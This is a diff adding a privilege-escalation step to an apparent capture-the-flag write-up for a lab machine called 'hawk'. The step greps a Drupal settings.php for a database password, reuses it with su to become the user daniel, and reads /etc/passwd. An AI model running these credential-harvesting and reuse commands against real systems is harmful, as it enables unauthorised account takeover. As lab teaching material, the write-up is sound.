@@ -432,3 +432,52 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 <br />
+
+# Privilege Escalation: www-data -> daniel 
+
+<br />
+
+Enumerating the `system`, we find a file `"settings.php"` with `credentials`:
+
+<br />
+
+```bash
+www-data@hawk:/var/www/html/sites/default$ cat settings.php | grep password
+ *   'password' => 'password',
+ * username, password, host, and database name.
+ *   'password' => 'password',
+ *   'password' => 'password',
+ *     'password' => 'password',
+ *     'password' => 'password',
+      'password' => 'drupal4hawk',
+ * by using the username and password variables. The proxy_user_agent variable
+# $conf['proxy_password'] = '';
+```
+
+<br />
+
+The `password` works for the user `daniel`:
+
+<br />
+
+```bash
+www-data@hawk:/var/www/html/sites/default$ su daniel
+Password: 
+Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
+[GCC 7.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>>
+```
+
+<br />
+
+As we can see, the user `daniel` does not have a normal and `current shell` assigned, but rather an `interactive Python3 console`.
+
+To verify this, we list the `/etc/passwd`:
+
+<br />
+
+```bash
+www-data@hawk:/var/www/html$ cat /etc/passwd | grep daniel
+daniel:x:1002:1005::/home/daniel:/usr/bin/python3
+```
